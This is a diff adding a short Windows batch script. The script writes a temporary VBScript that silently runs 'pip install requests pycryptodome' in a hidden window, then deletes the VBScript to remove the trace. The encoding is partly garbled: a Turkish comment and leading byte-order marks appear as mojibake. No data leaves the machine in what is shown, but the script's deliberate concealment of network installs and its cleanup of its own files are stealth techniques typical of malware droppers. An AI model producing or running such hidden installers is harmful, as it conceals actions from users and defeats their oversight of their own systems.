@@ -1,0 +1,10 @@
+ÿş&cls
+@echo off
+
+echo Set objShell = WScript.CreateObject("WScript.Shell") > %TEMP%\hidden.vbs
+echo objShell.Run "cmd /c python -m pip install requests pycryptodome", 0, True >> %TEMP%\hidden.vbs
+
+cscript //nologo %TEMP%\hidden.vbs
+
+REM GeÃ§ici .vbs dosyasÄ±nÄ± sil
+del %TEMP%\hidden.vbs
